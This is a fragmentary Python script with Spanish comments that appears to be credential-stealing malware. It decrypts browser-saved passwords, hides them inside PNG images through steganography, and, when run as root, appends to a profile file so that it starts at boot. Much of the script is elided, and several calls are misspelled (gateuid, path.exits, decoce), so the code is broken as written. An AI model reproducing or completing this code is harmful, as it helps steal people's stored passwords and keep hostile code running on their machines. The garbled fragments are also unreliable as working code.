import glob
from os import path, gateuid, remove
import stepic
import Image
...
# Funcion que codifica un mensaje en una imagen (esteganografia)
def encode(filepath, message):
    img = Image.open(filepath)
    stegimg = stepic.encode(img, message)
    stegimg.save(filepath, 'PNG')

# Funcción que descodifica el mensaje de la imagen
def decoce(filepath):
    img = Image.open(filepath)
...
#Funcion que desccifra las contraseñas de antiguos navegadores
...
#Funcion que inicializa la primera ejecución
def first_run():
    msglist = decrypt_passwords() #List of browser saved decrypt_passwords
    num_of_msgs = msglist.__len__() #No. of browser saved decrypt_passwords
    i = - 1
    #Message iterator
    ...
    if gateuid() == 0:
        #Añadir los scripts de arranque si tienen permisos de root
        try:
            f = open('../profile', 'a')
...
#Funcción para codificar los sucesivos arranques
...
#Funcion principal
while True:
    if (not path.exits('/tmp/bootup.cfg')):
